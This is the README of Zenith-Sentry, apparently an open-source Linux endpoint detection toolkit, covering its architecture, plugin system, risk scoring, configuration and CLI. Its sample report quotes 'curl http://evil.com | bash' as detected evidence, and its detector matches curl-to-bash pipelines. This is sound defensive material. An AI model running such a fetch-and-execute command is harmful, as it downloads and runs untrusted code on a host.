<p align="center">
  <img src="logo.svg" alt="Zenith-Sentry Logo" width="200"/>
</p>

<h1 align="center">Zenith-Sentry EDR</h1>

<p align="center">
  <i>A Lightweight, Open-Source Endpoint Detection & Response (EDR) Toolkit for Linux — built with an "Assume Breach" philosophy.</i>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.x-blue?style=flat-square&logo=python" alt="Python"/>
  <img src="https://img.shields.io/badge/Platform-Linux-orange?style=flat-square&logo=linux" alt="Linux"/>
  <img src="https://img.shields.io/badge/License-MIT-green?style=flat-square" alt="MIT License"/>
  <img src="https://img.shields.io/badge/MITRE-ATT%26CK-red?style=flat-square" alt="MITRE ATT&CK"/>
</p>

---

## Overview

Zenith-Sentry is a host-based intrusion detection and forensic toolkit for Linux. Rather than relying purely on static signatures, it actively hunts for **behavioral anomalies**, **in-memory execution**, and **suspicious persistence mechanisms** — mapping all findings directly to the **MITRE ATT&CK framework**.

The tool supports two interfaces:
- **Interactive TUI** (`gui.py`) — a full-screen terminal menu powered by Python `curses`
- **CLI Backend** (`main.py`) — raw command-line execution for scripting and SIEM integration

Scan results are **automatically saved** as timestamped JSON reports to a `user_data/` directory.

---

## Project Structure

```
Zenith-Sentry/
├── main.py               # CLI entry point (argparse-based)
├── gui.py                # Curses TUI — interactive terminal UI
├── start.sh              # Automated launcher: venv setup + GUI start
├── config.yaml           # Runtime configuration (ports, scan dirs)
├── requirements.txt      # Python dependencies (psutil, pyyaml)
├── logo.svg              # Project logo
└── zenith/               # Core engine package
    ├── __init__.py
    ├── core.py           # Data models: Finding, RiskLevel, Severity, IDetector
    ├── engine.py         # ZenithEngine — orchestrates collectors & detectors
    ├── collectors.py     # Telemetry collectors: Process, Network, System
    ├── registry.py       # PluginRegistry — dynamic plugin loader
    ├── config.py         # ConfigLoader — YAML config parser
    ├── utils.py          # Utility: safe_read() for file access
    └── plugins/
        ├── __init__.py
        └── detectors.py  # Built-in detector: ProcessDetector
```

---

## Core Architecture

Zenith-Sentry is built on a **modular, decoupled** architecture designed for extensibility:

| Component | File | Responsibility |
|---|---|---|
| **Engine** | `zenith/engine.py` | Orchestrates the full scan pipeline |
| **Collectors** | `zenith/collectors.py` | Gathers telemetry via `psutil` and the filesystem |
| **Plugin Registry** | `zenith/registry.py` | Dynamically loads all `IDetector` plugins at runtime |
| **Core Models** | `zenith/core.py` | Defines `Finding`, `RiskLevel`, `Severity`, and `IDetector` |
| **Config Loader** | `zenith/config.py` | Parses `config.yaml` via PyYAML |
| **TUI** | `gui.py` | Full-screen curses interface with colour-coded output |
| **CLI** | `main.py` | `argparse` CLI with `--json` and `--risk-threshold` flags |

### How a Scan Works

```
start.sh / main.py / gui.py
         │
         ▼
    ZenithEngine
         │
    ┌────┴────────────────────┐
    │                         │
    ▼                         ▼
Collectors              PluginRegistry
(Process/Network/       (auto-loads all
 System telemetry)       .py plugins)
    │                         │
    └────────────┬────────────┘
                 │
                 ▼
           IDetector.analyze()
                 │
                 ▼
           Risk Score (0–100)
                 │
                 ▼
     user_data/scan_<timestamp>.json
```

---

## Feature Breakdown

### 1. Process Analysis — `ProcessDetector` (`plugins/detectors.py`)
Inspects the live process tree for malicious execution patterns.

| Detection | MITRE Tactic | Description |
|---|---|---|
| **Suspicious Pipeline** | Execution (T1059) | Detects `curl ... \| bash` patterns in running process command lines |

> **Extensible**: Add new process checks by extending the plugin in `plugins/detectors.py` or dropping a new plugin file into `zenith/plugins/`.

### 2. Network Analysis — `NetworkCollector` (`collectors.py`)
Collects active TCP/UDP socket data for analysis by network-aware detector plugins.

- Currently returns an empty list (collector skeleton is in place for extension)
- Configurable via `config.yaml`: suspicious ports list and loopback ignore rules

### 3. Persistence Discovery — `SystemCollector` (`collectors.py`)
Scans the filesystem for persistence mechanisms.

- Accepts custom `scan_dirs` from `config.yaml`
- Currently returns an empty dict (collector skeleton ready for plugin extension)

### 4. Risk Scoring Engine (`engine.py`)
Calculates an aggregate **host risk score from 0 to 100** based on all findings:

```python
score = min(average(f.risk.value for f in findings), 100)
```

Risk levels are defined in `core.py`:

| Level | Value |
|---|---|
| `INFO` | 0 |
| `LOW` | 25 |
| `MEDIUM` | 50 |
| `HIGH` | 75 |
| `CRITICAL` | 100 |

### 5. Auto-Saved JSON Reports (`engine.py`)
Every scan automatically saves a structured report:

```
user_data/scan_YYYYMMDD_HHMMSS.json
```

Report schema:
```json
{
  "score": 75,
  "timestamp": "20260414_230000",
  "findings": [
    {
      "id": "<uuid>",
      "module": "ProcessAnalysis",
      "risk": "CRITICAL",
      "severity": "CRITICAL",
      "tactic": "Execution",
      "description": "Suspicious pipeline",
      "evidence": { "pid": 1234, "cmd": "curl http://evil.com | bash" }
    }
  ]
}
```

---

## Plugin System

Zenith-Sentry uses a **dynamic plugin loader** (`zenith/registry.py`). Any Python file placed inside `zenith/plugins/` that defines a class inheriting from `IDetector` is **automatically discovered and loaded** at runtime — no configuration required.

### Writing a Custom Plugin

```python
# zenith/plugins/my_detector.py
from zenith.core import IDetector, Finding, RiskLevel, Severity

class MyDetector(IDetector):
    name = "MyModule"

    def __init__(self, procs, conns, sys_files, config, **kwargs):
        self.procs = procs
        self.conns = conns
        self.sys_files = sys_files
        self.config = config

    def analyze(self):
        findings = []
        # ... your detection logic here
        return findings
```

Drop this file into `zenith/plugins/` and it will run automatically on the next scan.

---

## Configuration (`config.yaml`)

```yaml
network:
  suspicious_ports: [4444, 5555, 1337]  # Known C2 / high-risk ports
  ignore_loopback: true                  # Skip 127.0.0.1 connections

persistence:
  scan_dirs: []  # Additional directories to scan for persistence
```

---

## Installation & Usage

### Requirements

- **Python 3.x**
- **psutil** `5.9.8`
- **PyYAML** `6.0.1`

Install dependencies:
```bash
pip install -r requirements.txt
```

---

### Option 1: Interactive TUI (Recommended)

Run the automated launcher — it handles virtual environment creation and dependency setup automatically:

```bash
./start.sh
```

The `start.sh` script will:
1. Check for Python 3
2. Create a `.venv` virtual environment (if not present)
3. Install PyYAML into the venv
4. Launch the curses TUI (`gui.py`)
5. Clean up the venv on exit

> **Note:** `start.sh` installs PyYAML by directly extracting the source from PyPI (no pip required).

#### TUI Menu Options

| Option | Command |
|---|---|
| Full System Scan | `full-scan` |
| Process Analysis | `process` |
| Network Analysis | `network` |
| Persistence Discovery | `persistence` |
| Exit | — |

Navigate with **↑ / ↓ arrow keys** and press **Enter** to select. A confirmation prompt is shown before each scan.

---

### Option 2: CLI


# Run a complete system sweep

```
python3 main.py full-scan
```

# Output findings in JSON format (for SIEM ingestion)

```
python3 main.py full-scan --json
```

# Targeted process scan
```
python3 main.py process
```
# Targeted network scan
```
python3 main.py network
```
# Targeted persistence scan
```
python3 main.py persistence
```
# Only show findings above a risk score of 50
```
python3 main.py full-scan --risk-threshold 50
```
# Use a custom config file
```
python3 main.py full-scan --profile /path/to/custom_config.yaml
```

#### CLI Arguments

| Argument | Type | Default | Description |
|---|---|---|---|
| `command` | positional | — | `full-scan`, `network`, `process`, `persistence`, `fim`, `hunt` |
| `--json` | flag | `False` | Output results as JSON |
| `--profile` | `str` | `config.yaml` | Path to a YAML config file |
| `--risk-threshold` | `int` | `0` | Minimum risk value to display findings |

---

## Dependencies

| Package | Version | Purpose |
|---|---|---|
| `psutil` | `5.9.8` | Process & system telemetry collection |
| `pyyaml` | `6.0.1` | YAML config file parsing |

All other modules used (`curses`, `argparse`, `json`, `uuid`, `importlib`, `inspect`) are part of the Python standard library.


<p align="center">
  Built for Linux defenders. Designed for extensibility.
</p>
